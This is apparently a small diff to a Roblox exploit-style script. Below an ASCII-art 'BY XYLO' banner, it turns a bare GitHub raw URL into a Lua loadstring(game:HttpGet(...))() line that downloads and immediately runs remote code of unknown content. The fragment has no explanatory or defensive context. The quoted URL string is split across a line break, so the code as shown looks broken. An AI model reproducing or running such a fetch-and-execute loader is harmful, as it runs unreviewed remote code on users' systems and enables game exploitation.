@@ -11,4 +11,5 @@
 ██╔══██╗  ╚██╔╝       ██╔██╗   ╚██╔╝  ██║     ██║   ██║
 ██████╔╝   ██║       ██╔╝ ██╗   ██║   ███████╗╚██████╔╝
 ╚═════╝    ╚═╝       ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ 
-https://raw.githubusercontent.com/xyloscript/DEOFMOPABOBOKABA/refs/heads/main/FUCKYOUBYBABYXYLO_XI
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/xyloscript/DEOFMOPABOBOKABA/refs/heads/main/FUCKYOUBYBABYXYLO_XI
+"))()
